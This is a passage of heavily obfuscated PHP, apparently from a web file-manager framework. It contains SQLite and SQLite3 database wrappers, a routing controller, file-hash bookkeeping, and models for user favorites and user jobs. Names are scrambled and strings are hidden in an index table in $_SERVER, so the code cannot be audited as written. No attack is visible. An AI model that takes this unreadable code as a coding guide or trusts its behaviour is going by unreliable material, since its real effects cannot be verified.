&$Š¹±Ş“…) { Hook::trigger($¢œ°Ïœ[671], $Š¹±Ş“…); $Š¹±Ş“…[$¢œ°Ïœ[87]] = $ï¥æİéñ->getPathInner($Š¹±Ş“…[$¢œ°Ïœ[87]]); $‹Û´›º = $ï¥æİéñ->hashSimple($Š¹±Ş“…[$¢œ°Ïœ[87]]); $Üşƒò…ß = $ï¥æİéñ->hashMd5($Š¹±Ş“…[$¢œ°Ïœ[87]]); if (strlen($Üşƒò…ß) > 10 && !isset($ûÔ•ÊÑ®[$Üşƒò…ß])) { $ûÔ•ÊÑ®[$Üşƒò…ß] = array(); } $Š¹±Ş“…[$¢œ°Ïœ[672]] = $‹Û´›º; $Š¹±Ş“…[$¢œ°Ïœ[547]] = $Üşƒò…ß; $ûÔ•ÊÑ®[$Üşƒò…ß][] =& $Š¹±Ş“…; if (count($ûÔ•ÊÑ®[$Üşƒò…ß]) > 1) { $Š¹±Ş“…[$¢œ°Ïœ[670]] = !0; } Hook::trigger($¢œ°Ïœ[673], $Š¹±Ş“…); } unset($Š¹±Ş“…); $¢¾Ê±½Ê = array($¢œ°Ïœ[547] => array($¢œ°Ïœ[7], array_keys($ûÔ•ÊÑ®))); $ì²ß­ÕÙ = Model($¢œ°Ïœ[674]); $êÀŒü¦Ç = $ì²ß­ÕÙ->where($¢¾Ê±½Ê)->select(); $êÀŒü¦Ç = $êÀŒü¦Ç ? $êÀŒü¦Ç : array(); foreach ($êÀŒü¦Ç as $Ğ×„Ù¼º) { if (!isset($ûÔ•ÊÑ®[$Ğ×„Ù¼º[$¢œ°Ïœ[547]]])) { continue; } $¬‘íµËş = $ûÔ•ÊÑ®[$Ğ×„Ù¼º[$¢œ°Ïœ[547]]]; foreach ($¬‘íµËş as &$Š¹±Ş“…) { $Š¹±Ş“…[$¢œ°Ïœ[541]] = $Ğ×„Ù¼º[$¢œ°Ïœ[541]]; $Š¹±Ş“…[$¢œ°Ïœ[670]] = !0; } unset($Š¹±Ş“…); } $¼¨ÜÉ = array(); foreach ($Éè»ñ¿· as $ÑŠŒË…ı) { Hook::trigger($¢œ°Ïœ[675], $ÑŠŒË…ı); if (isset($ÑŠŒË…ı[$¢œ°Ïœ[670]]) && $ÑŠŒË…ı[$¢œ°Ïœ[670]]) { Hook::trigger($¢œ°Ïœ[676], $ÑŠŒË…ı); continue; } $¼úäÇ÷Å = $ï¥æİéñ->getPathInner($ÑŠŒË…ı[$¢œ°Ïœ[87]]); $å¨’§ßÚ = $ì²ß­ÕÙ->addFileMake($¼úäÇ÷Å, $ÑŠŒË…ı[$¢œ°Ïœ[79]], $ÑŠŒË…ı[$¢œ°Ïœ[672]], $ÑŠŒË…ı[$¢œ°Ïœ[547]], $ÑŠŒË…ı[$¢œ°Ïœ[32]], $ˆŠÖŠ€©); Hook::trigger($¢œ°Ïœ[676], $ÑŠŒË…ı); if (!is_array($å¨’§ßÚ)) { continue; } $¼¨ÜÉ[] = $å¨’§ßÚ; } $ì²ß­ÕÙ->addAll($¼¨ÜÉ); $¢¾Ê±½Ê = array($¢œ°Ïœ[547] => array($¢œ°Ïœ[7], array_keys($ûÔ•ÊÑ®))); $êÀŒü¦Ç = $ì²ß­ÕÙ->where($¢¾Ê±½Ê)->select(); $êÀŒü¦Ç = $êÀŒü¦Ç ? $êÀŒü¦Ç : array(); foreach ($êÀŒü¦Ç as $Ğ×„Ù¼º) { if (!isset($ûÔ•ÊÑ®[$Ğ×„Ù¼º[$¢œ°Ïœ[547]]])) { continue; } $´°Ü …Ÿ =& $ûÔ•ÊÑ®[$Ğ×„Ù¼º[$¢œ°Ïœ[547]]]; foreach ($´°Ü …Ÿ as &$Š¹±Ş“…) { $Š¹±Ş“…[$¢œ°Ïœ[541]] = $Ğ×„Ù¼º[$¢œ°Ïœ[541]]; } unset($Š¹±Ş“…); } $Û§¼ü×Ê = array(); foreach ($Éè»ñ¿· as $ˆÍü£¢‚) { $Û§¼ü×Ê[$ˆÍü£¢‚[$¢œ°Ïœ[32]]] = $ˆÍü£¢‚; } return $Û§¼ü×Ê; } } define($_SERVER[ˆ¡¹µ‹Â][677], $_SERVER[ˆ¡¹µ‹Â][678]); $tukerlwafc = $_SERVER[ˆ¡¹µ‹Â][679]; goto d¦ä¡Æë¸–; Fê‡éİÎ¼™: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $„Æò¦‚Ö =& $_SERVER[ˆ¡¹µ‹Â]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$„Æò¦‚Ö[6]] =& $config; $this->values[$„Æò¦‚Ö[7]] =& $in; $this->tpl = TEMPLATE . MOD . $„Æò¦‚Ö[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ö³Ú¥ÙŸ) { if (1 === func_num_args()) { $this->{$ö³Ú¥ÙŸ} = new $ö³Ú¥ÙŸ(); } else { $Ü¦Ç = new ReflectionClass($ö³Ú¥ÙŸ); $½¸•õã¯ = func_get_args(); array_shift($½¸•õã¯); $this->{$ö³Ú¥ÙŸ} = $Ü¦Ç->newInstanceArgs($½¸•õã¯); } return $this->{$ö³Ú¥ÙŸ}; } public function routeBind($èòøõº, $‘êôõ˜ù, $œí·‘‚— = 3) { $İø¨››¤ =& $_SERVER[ˆ¡¹µ‹Â]; $ŞÑ™ú¯ç = $this->in[$İø¨››¤[9]]; $èòøõº = str_replace($İø¨››¤[10], $İø¨››¤[11], trim(trim($èòøõº, $İø¨››¤[8]), $İø¨››¤[12])); if (!$èòøõº || count($ŞÑ™ú¯ç) <= $œí·‘‚—) { return !1; } $©»Œ¯’³ = !0; $ÑĞõ¨Š = explode($İø¨››¤[8], $èòøõº); for ($ÑÀ¸Ò–ı = 0; $ÑÀ¸Ò–ı < count($ÑĞõ¨Š); $ÑÀ¸Ò–ı++) { if ($ÑĞõ¨Š[$ÑÀ¸Ò–ı] != $ŞÑ™ú¯ç[$œí·‘‚— + $ÑÀ¸Ò–ı]) { $©»Œ¯’³ = !1; break; } } if (!$©»Œ¯’³) { return; } call_user_func_array(array($this, $‘êôõ˜ù), array()); } public function routeArgs($µ—„“¶à = 3) { $²«ÓÕ— = $this->in[$_SERVER[ˆ¡¹µ‹Â][9]]; if (count($²«ÓÕ—) <= $µ—„“¶à) { return array(); } $—ò¿ñ€˜ = array(); for ($Ôõğƒ÷• = $µ—„“¶à; $Ôõğƒ÷• < count($²«ÓÕ—); $Ôõğƒ÷• += 2) { $—ò¿ñ€˜[$²«ÓÕ—[$Ôõğƒ÷•]] = $²«ÓÕ—[$Ôõğƒ÷• + 1]; $this->in[$²«ÓÕ—[$Ôõğƒ÷•]] = $²«ÓÕ—[$Ôõğƒ÷• + 1]; } return $—ò¿ñ€˜; } protected function assign($‹‚öıÃ‰, $Î§ÁÏñõ) { $this->values[$‹‚öıÃ‰] = $Î§ÁÏñõ; } protected function display($«ØÌÙ½æ) { ob_end_clean(); extract($this->values); require $this->tpl . $«ØÌÙ½æ; } } class DbSqliteBase extends Db { public function __construct($Õ“¢êÊ = '') { $óÎƒÏ­± =& $_SERVER[ˆ¡¹µ‹Â]; if (!extension_loaded($óÎƒÏ­±[13])) { think_exception(think_lang($óÎƒÏ­±[14]) . $óÎƒÏ­±[15]); } if (!empty($Õ“¢êÊ)) { if (!isset($Õ“¢êÊ[$óÎƒÏ­±[16]])) { $Õ“¢êÊ[$óÎƒÏ­±[16]] = 438; } $this->config = $Õ“¢êÊ; if (empty($this->config[$óÎƒÏ­±[17]])) { $this->config[$óÎƒÏ­±[17]] = array(); } } } public function connect($ê „æÎ´ = '', $©—şğ€‰ = 0) { $ûêéş”ç =& $_SERVER[ˆ¡¹µ‹Â]; if (!isset($this->linkID[$©—şğ€‰])) { if (empty($ê „æÎ´)) { $ê „æÎ´ = $this->config; } $ÍÎÑ¹ü = !empty($ê „æÎ´[$ûêéş”ç[17]][$ûêéş”ç[18]]) ? $ê „æÎ´[$ûêéş”ç[17]][$ûêéş”ç[18]] : $this->pconnect; $…®Íí‡ = $ÍÎÑ¹ü ? $ûêéş”ç[19] : $ûêéş”ç[20]; $this->linkID[$©—şğ€‰] = $…®Íí‡($ê „æÎ´[$ûêéş”ç[21]], $ê „æÎ´[$ûêéş”ç[16]]); if (!$this->linkID[$©—şğ€‰]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$©—şğ€‰], 30000); if (1 != think_config($ûêéş”ç[22])) { unset($this->config); } } return $this->linkID[$©—şğ€‰]; } public function free() { $this->queryID = null; } public function query($ØÕ¾îÏù) { $©•¨÷¬ =& $_SERVER[ˆ¡¹µ‹Â]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ØÕ¾îÏù; if ($this->queryID) { $this->free(); } think_action_status($©•¨÷¬[23], 1); think_status($©•¨÷¬[24]); $this->queryID = sqlite_query($this->_linkID, $ØÕ¾îÏù); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $¬İ´üß = $this->getAll(); return $¬İ´üß; } } public function execute($¾‹’›ÁÖ) { $ÆŞóšÓÀ =& $_SERVER[ˆ¡¹µ‹Â]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¾‹’›ÁÖ; if ($this->queryID) { $this->free(); } think_action_status($ÆŞóšÓÀ[25], 1); think_status($ÆŞóšÓÀ[24]); $Ÿ»Ç‘Éç = sqlite_exec($this->_linkID, $¾‹’›ÁÖ); $this->debug(); if (!1 === $Ÿ»Ç‘Éç) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ˆ¡¹µ‹Â][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÕÒıËÒ¶ = sqlite_query($this->_linkID, $_SERVER[ˆ¡¹µ‹Â][27]); if (!$ÕÒıËÒ¶) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ê¬“Ç = sqlite_query($this->_linkID, $_SERVER[ˆ¡¹µ‹Â][28]); if (!$Ê¬“Ç) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¬½è˜—€ = array(); if ($this->numRows > 0) { for ($µÚ¸‰Èã = 0; $µÚ¸‰Èã < $this->numRows; $µÚ¸‰Èã++) { $¬½è˜—€[$µÚ¸‰Èã] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¬½è˜—€; } public function getFields($ƒíÛ±¿Æ) { $İò»šÄÕ =& $_SERVER[ˆ¡¹µ‹Â]; $•õşˆäŞ = $this->query($İò»šÄÕ[29] . $ƒíÛ±¿Æ . $İò»šÄÕ[30]); $›÷‹ë˜ = array(); if ($•õşˆäŞ) { foreach ($•õşˆäŞ as $¸à–¤Ä => $¶‚­¹­) { $›÷‹ë˜[$¶‚­¹­[$İò»šÄÕ[31]]] = array($İò»šÄÕ[32] => $¶‚­¹­[$İò»šÄÕ[31]], $İò»šÄÕ[33] => $¶‚­¹­[$İò»šÄÕ[34]], $İò»šÄÕ[35] => (bool) ($¶‚­¹­[$İò»šÄÕ[36]] === $İò»šÄÕ[12]), $İò»šÄÕ[37] => $¶‚­¹­[$İò»šÄÕ[38]], $İò»šÄÕ[39] => strtolower($¶‚­¹­[$İò»šÄÕ[40]]) == $İò»šÄÕ[41], $İò»šÄÕ[42] => strtolower($¶‚­¹­[$İò»šÄÕ[43]]) == $İò»šÄÕ[44]); } } return $›÷‹ë˜; } public function getTables($­µÂ§Šª = '') { $ÜÑ©  =& $_SERVER[ˆ¡¹µ‹Â]; $è™ÓŒ Œ = $this->query($ÜÑ© [45] . $ÜÑ© [46] . $ÜÑ© [47]); $¼´ºì¥¬ = array(); foreach ($è™ÓŒ Œ as $ˆÇÏ¢¥ => $üÅ˜÷Ç±) { $¼´ºì¥¬[$ˆÇÏ¢¥] = current($üÅ˜÷Ç±); } return $¼´ºì¥¬; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ñÔ¬şĞÌ =& $_SERVER[ˆ¡¹µ‹Â]; $ÏÑ¨—Í = sqlite_last_error($this->_linkID); $this->error = $ÏÑ¨—Í . $ñÔ¬şĞÌ[4] . sqlite_error_string($ÏÑ¨—Í); if ($ñÔ¬şĞÌ[12] != $this->queryStr) { $this->error .= LNG($ñÔ¬şĞÌ[48]) . $this->queryStr; } think_trace($this->error, $ñÔ¬şĞÌ[12], $ñÔ¬şĞÌ[49]); return $this->error; } public function escapeString($˜ƒÁ¬’‘) { return sqlite_escape_string($˜ƒÁ¬’‘); } public function parseLimit($Ã”Ô¥œÙ) { $ïÕìÉ«ú =& $_SERVER[ˆ¡¹µ‹Â]; $í´†„ = $ïÕìÉ«ú[12]; if (!empty($Ã”Ô¥œÙ)) { $Ã”Ô¥œÙ = explode($ïÕìÉ«ú[50], $Ã”Ô¥œÙ); if (count($Ã”Ô¥œÙ) > 1) { $í´†„ .= $ïÕìÉ«ú[51] . $Ã”Ô¥œÙ[1] . $ïÕìÉ«ú[52] . $Ã”Ô¥œÙ[0] . $ïÕìÉ«ú[53]; } else { $í´†„ .= $ïÕìÉ«ú[51] . $Ã”Ô¥œÙ[0] . $ïÕìÉ«ú[53]; } } return $í´†„; } } class DbSqlite3Base extends Db { public function __construct($ì¾®ÚØ = '') { $—º¥²Âò =& $_SERVER[ˆ¡¹µ‹Â]; if (!class_exists($—º¥²Âò[54])) { think_exception(think_lang($—º¥²Âò[14]) . $—º¥²Âò[55]); } if (!empty($ì¾®ÚØ)) { if (!isset($ì¾®ÚØ[$—º¥²Âò[16]])) { $ì¾®ÚØ[$—º¥²Âò[16]] = 438; } $this->config = $ì¾®ÚØ; if (empty($this->config[$—º¥²Âò[17]])) { $this->config[$—º¥²Âò[17]] = array(); } } } public function connect($òÉâ­àÉ = '', $¢š¯íÎˆ = 0) { $—ÙÌÊ¡± =& $_SERVER[ˆ¡¹µ‹Â]; if (!isset($this->linkID[$¢š¯íÎˆ])) { if (empty($òÉâ­àÉ)) { $òÉâ­àÉ = $this->config; } $this->linkID[$¢š¯íÎˆ] = new SQLite3($òÉâ­àÉ[$—ÙÌÊ¡±[21]]); if (!$this->linkID[$¢š¯íÎˆ]) { think_exception($this->linkID[$¢š¯íÎˆ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$¢š¯íÎˆ]->busyTimeout(30000); if (1 != think_config($—ÙÌÊ¡±[22])) { unset($this->config); } } return $this->linkID[$¢š¯íÎˆ]; } public function free() { $this->queryID = null; } public function query($ğÍÙ×æˆ) { $ÜºôË =& $_SERVER[ˆ¡¹µ‹Â]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ğÍÙ×æˆ; if ($this->queryID) { $this->free(); } think_action_status($ÜºôË[23], 1); think_status($ÜºôË[24]); $this->queryID = $this->_linkID->query($ğÍÙ×æˆ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ÀşÎ„¤± = $this->getAll(); $this->numRows = count($ÀşÎ„¤±); return $ÀşÎ„¤±; } } public function execute($ÊÕÜ€ğÙ) { $¤ıÆğù =& $_SERVER[ˆ¡¹µ‹Â]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÊÕÜ€ğÙ; if ($this->queryID) { $this->free(); } think_action_status($¤ıÆğù[25], 1); think_status($¤ıÆğù[24]); $‹Ì›ˆ‡ = $this->_linkID->exec($ÊÕÜ€ğÙ); $this->debug(); if (!1 === $‹Ì›ˆ‡) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ˆ¡¹µ‹Â][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¶ØÂĞæû = $this->_linkID->query($_SERVER[ˆ¡¹µ‹Â][27]); if (!$¶ØÂĞæû) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $»÷Îò¯ = $this->_linkID->query($_SERVER[ˆ¡¹µ‹Â][28]); if (!$»÷Îò¯) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $·ñçûöÖ = array(); while ($‘™Ó÷ş = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $·ñçûöÖ[] = $‘™Ó÷ş; } $this->queryID->reset(); return $·ñçûöÖ; } public function getFields($éãÄê÷œ) { $šÁ¶Î¦ñ =& $_SERVER[ˆ¡¹µ‹Â]; $¿¢÷Æñ = $this->query($šÁ¶Î¦ñ[29] . $éãÄê÷œ . $šÁ¶Î¦ñ[30]); $Ï’í¼‰î = array(); if ($¿¢÷Æñ) { foreach ($¿¢÷Æñ as $åÏóÃÊ— => $½ü£à™Ã) { $Ï’í¼‰î[$½ü£à™Ã[$šÁ¶Î¦ñ[32]]] = array($šÁ¶Î¦ñ[32] => $½ü£à™Ã[$šÁ¶Î¦ñ[32]], $šÁ¶Î¦ñ[33] => $½ü£à™Ã[$šÁ¶Î¦ñ[33]], $šÁ¶Î¦ñ[35] => (bool) ($½ü£à™Ã[$šÁ¶Î¦ñ[35]] === $šÁ¶Î¦ñ[12]), $šÁ¶Î¦ñ[37] => $½ü£à™Ã[$šÁ¶Î¦ñ[56]], $šÁ¶Î¦ñ[39] => (bool) $½ü£à™Ã[$šÁ¶Î¦ñ[57]], $šÁ¶Î¦ñ[42] => (bool) $½ü£à™Ã[$šÁ¶Î¦ñ[57]]); } } return $Ï’í¼‰î; } public function getTables($Ê÷Òà« = '') { $¯³½úÃ =& $_SERVER[ˆ¡¹µ‹Â]; $Âä†Œ€º = $this->query($¯³½úÃ[45] . $¯³½úÃ[46] . $¯³½úÃ[47]); $¿©ş­ÃÒ = array(); foreach ($Âä†Œ€º as $ÃßÆ­ÃÚ => $ˆ©åòÏç) { $¿©ş­ÃÒ[$ÃßÆ­ÃÚ] = current($ˆ©åòÏç); } return $¿©ş­ÃÒ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ßßêöñ =& $_SERVER[ˆ¡¹µ‹Â]; $this->error = $this->_linkID->lastErrorMsg(); if ($ßßêöñ[12] != $this->queryStr) { $this->error .= LNG($ßßêöñ[48]) . $this->queryStr; } think_trace($this->error, $ßßêöñ[12], $ßßêöñ[49]); return $this->error; } public function escapeString($«â×Á¯Ğ) { $ÂŸ«ŞÈ— =& $_SERVER[ˆ¡¹µ‹Â]; if ($this->_linkID) { return $this->_linkID->escapeString($«â×Á¯Ğ); } return str_ireplace($ÂŸ«ŞÈ—[58], $ÂŸ«ŞÈ—[59], $«â×Á¯Ğ); } public function parseLimit($øÅÕğ¼) { $ß™Ö•ï“ =& $_SERVER[ˆ¡¹µ‹Â]; $Ûãİäû– = $ß™Ö•ï“[12]; if (!empty($øÅÕğ¼)) { $øÅÕğ¼ = explode($ß™Ö•ï“[50], $øÅÕğ¼); if (count($øÅÕğ¼) > 1) { $Ûãİäû– .= $ß™Ö•ï“[51] . $øÅÕğ¼[1] . $ß™Ö•ï“[52] . $øÅÕğ¼[0] . $ß™Ö•ï“[53]; } else { $Ûãİäû– .= $ß™Ö•ï“[51] . $øÅÕğ¼[0] . $ß™Ö•ï“[53]; } } return $Ûãİäû–; } } goto E¨ñ¬ÁÑ‚«; F„ñ•„¥íË: class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\137\146\x61\x76"; protected function cacheFunctionAlias($È›³§ü¥) { $®Ò¾íÏ÷ =& $_SERVER[ˆ¡¹µ‹Â]; return array($®Ò¾íÏ÷[2077] => array(USER_ID, $®Ò¾íÏ÷[2444])); } protected function listData() { $£ôÁ÷¯• =& $_SERVER[ˆ¡¹µ‹Â]; $ÔÅÄ§ = array($£ôÁ÷¯•[1754] => USER_ID, $£ôÁ÷¯•[557] => 0); $ì£‰ÛÛƒ = $£ôÁ÷¯•[2445]; $·üòËÁÏ = $this->field($ì£‰ÛÛƒ)->where($ÔÅÄ§)->order($£ôÁ÷¯•[2446])->select(); return $·üòËÁÏ ? $·üòËÁÏ : array(); } protected function resetCache() { } protected function listView() { $ËÉªë¢ =& $_SERVER[ˆ¡¹µ‹Â]; $á¥ëåğÖ = $this->listData(); $øÙ¹‰Ó = array_filter_by_field($á¥ëåğÖ, $ËÉªë¢[33], $ËÉªë¢[490]); $ÆÚ¾“›ß = array_to_keyvalue($øÙ¹‰Ó, $ËÉªë¢[12], $ËÉªë¢[87]); if (!$ÆÚ¾“›ß) { return $á¥ëåğÖ; } $Ì¤µèƒ‚ = 2000; $à’éÍ™œ = array($ËÉªë¢[491] => array($ËÉªë¢[492], $ÆÚ¾“›ß)); $Ğ¥ë•Ù = Model($ËÉªë¢[899])->listSource($à’éÍ™œ, $Ì¤µèƒ‚); $Ğ¥ë•Ù = array_merge($Ğ¥ë•Ù[$ËÉªë¢[86]], $Ğ¥ë•Ù[$ËÉªë¢[85]]); $Ğ¥ë•Ù = array_to_keyvalue($Ğ¥ë•Ù, $ËÉªë¢[193]); foreach ($á¥ëåğÖ as $ôÆì˜› => $­«Ôá) { $±«“–º = $Ğ¥ë•Ù[$­«Ôá[$ËÉªë¢[87]]]; $±«“–º = $±«“–º ? $±«“–º : array(); $á¥ëåğÖ[$ôÆì˜›] = array_merge($±«“–º, $­«Ôá); } return $á¥ëåğÖ; } protected function addFav($È‘°…’ß, $ºâ•ù‰ù = '', $¶£ºĞ¥ = "\x73\x6f\165\x72\x63\x65") { $Š´‰Í‰” =& $_SERVER[ˆ¡¹µ‹Â]; $®ƒÇ×ÎÂ = array($Š´‰Í‰”[1754] => USER_ID, $Š´‰Í‰”[557] => 0, $Š´‰Í‰”[496] => $¶£ºĞ¥, $Š´‰Í‰”[495] => $È‘°…’ß); if ($this->where($®ƒÇ×ÎÂ)->find()) { return !1; } $®ƒÇ×ÎÂ = array($Š´‰Í‰”[1754] => USER_ID, $Š´‰Í‰”[557] => 0); $¨²»Óšï = $this->where($®ƒÇ×ÎÂ)->max($Š´‰Í‰”[1986]); if (!$¨²»Óšï) { $¨²»Óšï = 0; } if (!$ºâ•ù‰ù && $¶£ºĞ¥ == $Š´‰Í‰”[490]) { $’¹ßğ¹´ = Model($Š´‰Í‰”[1411])->where(array($Š´‰Í‰”[491] => $È‘°…’ß))->find(); if (!$’¹ßğ¹´) { return !1; } $ºâ•ù‰ù = $’¹ßğ¹´[$Š´‰Í‰”[32]]; } $ºâ•ù‰ù = $this->getAutoName($ºâ•ù‰ù); $òŒÇşéã = array($Š´‰Í‰”[1754] => USER_ID, $Š´‰Í‰”[557] => 0, $Š´‰Í‰”[494] => $ºâ•ù‰ù, $Š´‰Í‰”[495] => $È‘°…’ß, $Š´‰Í‰”[496] => $¶£ºĞ¥, $Š´‰Í‰”[1966] => $¨²»Óšï + 1); return $this->add($òŒÇşéã); } protected function remove($‡ö³Æ) { $„ÈÔ«½ =& $_SERVER[ˆ¡¹µ‹Â]; $Ï–½÷ã© = array($„ÈÔ«½[1754] => USER_ID, $„ÈÔ«½[493] => $‡ö³Æ); return $this->where($Ï–½÷ã©)->delete(); } protected function removeByName($æ’êî§) { $ğåíÏ×û =& $_SERVER[ˆ¡¹µ‹Â]; $è›´²Œ¦ = array($ğåíÏ×û[1754] => USER_ID, $ğåíÏ×û[494] => $æ’êî§, $ğåíÏ×û[557] => 0); return $this->where($è›´²Œ¦)->delete(); } protected function rename($¼¤ı‘é, $Úå•Åòò) { $š½ì¬¤ =& $_SERVER[ˆ¡¹µ‹Â]; if ($¼¤ı‘é == $Úå•Åòò) { return !1; } $Ÿ¤¨ñ© = $this->getAutoName($Úå•Åòò); if ($Úå•Åòò != $Ÿ¤¨ñ©) { return !1; } $¨öÀˆõ = array($š½ì¬¤[1754] => USER_ID, $š½ì¬¤[557] => 0, $š½ì¬¤[32] => $¼¤ı‘é); return $this->where($¨öÀˆõ)->save(array($š½ì¬¤[32] => $Úå•Åòò)); } protected function resetSort($è—Ã‰Şë) { $ÍîÔ¿Ú„ =& $_SERVER[ˆ¡¹µ‹Â]; $è—Ã‰Şë = is_array($è—Ã‰Şë) ? $è—Ã‰Şë : array(); $›óøæŸÚ = array($ÍîÔ¿Ú„[1754] => USER_ID); for ($­¯Ü«¬È = 0; $­¯Ü«¬È < count($è—Ã‰Şë); $­¯Ü«¬È++) { $›óøæŸÚ[$ÍîÔ¿Ú„[493]] = $è—Ã‰Şë[$­¯Ü«¬È]; $this->where($›óøæŸÚ)->save(array($ÍîÔ¿Ú„[1966] => $­¯Ü«¬È + 1)); } return !0; } protected function moveTop($Æµ¡‹¤˜) { $Ì´ÒçÑ =& $_SERVER[ˆ¡¹µ‹Â]; $ì¹¨›¬¼ = array($Ì´ÒçÑ[1754] => USER_ID, $Ì´ÒçÑ[557] => 0); $¯Ç¾¯®û = $this->where($ì¹¨›¬¼)->where(array($Ì´ÒçÑ[32] => $Æµ¡‹¤˜))->find(); if (!$¯Ç¾¯®û) { return; } $­¬†óè = $this->field($Ì´ÒçÑ[475])->where($ì¹¨›¬¼)->order($Ì´ÒçÑ[2446])->select(); $­¬†óè = array_to_keyvalue($­¬†óè, $Ì´ÒçÑ[12], $Ì´ÒçÑ[475]); $¹™Õ•ˆ = $­¬†óè; $­¬†óè = array_remove_value($­¬†óè, $¯Ç¾¯®û[$Ì´ÒçÑ[475]]); array_unshift($­¬†óè, $¯Ç¾¯®û[$Ì´ÒçÑ[475]]); return $this->resetSort($­¬†óè); } protected function moveBottom($îï…»³) { $ş§†ÇÇ« =& $_SERVER[ˆ¡¹µ‹Â]; $Ú… «¹° = array($ş§†ÇÇ«[1754] => USER_ID, $ş§†ÇÇ«[557] => 0); $¨›Íàà = $this->where($Ú… «¹°)->max($ş§†ÇÇ«[1986]); $û¬çïËü = array($ş§†ÇÇ«[1986] => $¨›Íàà + 1); return $this->where($Ú… «¹°)->where(array($ş§†ÇÇ«[32] => $îï…»³))->save($û¬çïËü); } private function getAutoName($˜œéÄ„À) { $ŒÊïÊÜì =& $_SERVER[ˆ¡¹µ‹Â]; $ÜÄÓÕß = array($ŒÊïÊÜì[1754] => USER_ID, $ŒÊïÊÜì[557] => 0); $Á…²¾ÚŸ = $this->field($ŒÊïÊÜì[32])->where($ÜÄÓÕß)->select(); $Á…²¾ÚŸ = array_to_keyvalue($Á…²¾ÚŸ, $ŒÊïÊÜì[12], $ŒÊïÊÜì[32]); if (!$Á…²¾ÚŸ || !in_array($˜œéÄ„À, $Á…²¾ÚŸ)) { return $˜œéÄ„À; } for ($´’ÀáË = 0; $´’ÀáË < count($Á…²¾ÚŸ); $´’ÀáË++) { if (!in_array($˜œéÄ„À . "\50{$´’ÀáË}\51", $Á…²¾ÚŸ)) { return $˜œéÄ„À . "\x28{$´’ÀáË}\51"; } } return $˜œéÄ„À . "\50{$´’ÀáË}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\56\152\157\x62\114\151\163\x74"; public $field = array("\156\x61\x6d\x65", "\144\145\163\143", "\x73\x6f\162\x74"); const JOB_KEY = "\x73\x65\154\146\112\157\142\114\151\163\x74"; public function listData($­îÇîÅ£ = false, $äı¼û¾ = "\163\157\x72\164", $…¥ÅŠø = false) { return parent::listData($­îÇîÅ£, $äı¼û¾, $…¥ÅŠø); } public function remove($ëÕõ±²ó) { return parent::remove($ëÕõ±²ó); } public function add($·Òûèç) { $ÌÑôúî =& $_SERVER[ˆ¡¹µ‹Â]; if ($this->findByName($·Òûèç[$ÌÑôúî[32]])) { return !1; } $·Òûèç[$ÌÑôúî[1986]] = $this->getSort(); return parent::insert($·Òûèç); } private function getSort() { $¢ÈŸ©íë =& $_SERVER[ˆ¡¹µ‹Â]; $öäÍ¹ˆ¶ = parent::listData(); $†Àâ×Ğ• = array_to_keyvalue($öäÍ¹ˆ¶, $¢ÈŸ©íë[12], $¢ÈŸ©íë[1986]); return empty($†Àâ×Ğ•) ? 0 : max($†Àâ×Ğ•) + 1; } public function update($”í²Ôøø, $¼™Êû’Ÿ) { $ŸäâšÙª =& $_SERVER[ˆ¡¹µ‹Â]; $¼’â“¨ = parent::listData($”í²Ôøø); $„ëé—­ƒ = $this->findByName($¼™Êû’Ÿ[$ŸäâšÙª[32]]); if (!$¼’â“¨ || $„ëé—­ƒ && $„ëé—­ƒ[$ŸäâšÙª[475]] != $¼’â“¨[$ŸäâšÙª[475]]) { return !1; } return parent::update($”í²Ôøø, $¼™Êû’Ÿ); } public function setUserJob($·âíÆ¢, $Ñ¤é¿§) { $Ù‚ÖÑ¸ =& $_SERVER[ˆ¡¹µ‹Â]; if (!is_array($Ñ¤é¿§)) { $Ñ¤é¿§ = array($Ñ¤é¿§); } $úìÆ™ó• = parent::listData(); $²øùÕ¿Ê = array_to_keyvalue($úìÆ™ó•, $Ù‚ÖÑ¸[32]); $–¥—æ¥â = $Ù‚ÖÑ¸[454]; foreach ($Ñ¤é¿§ as $¼ƒºÅŸŸ) { if ($²øùÕ¿Ê[$¼ƒºÅŸŸ]) { $–¥—æ¥â .= $²øùÕ¿Ê[$¼ƒºÅŸŸ][$Ù‚ÖÑ¸[475]] . $Ù‚ÖÑ¸[50]; } else { $óù¸˜»÷ = $this->add($¼ƒºÅŸŸ); $–¥—æ¥â .= $óù¸˜»÷ . $Ù‚ÖÑ¸[50]; } } $–¥—æ¥â 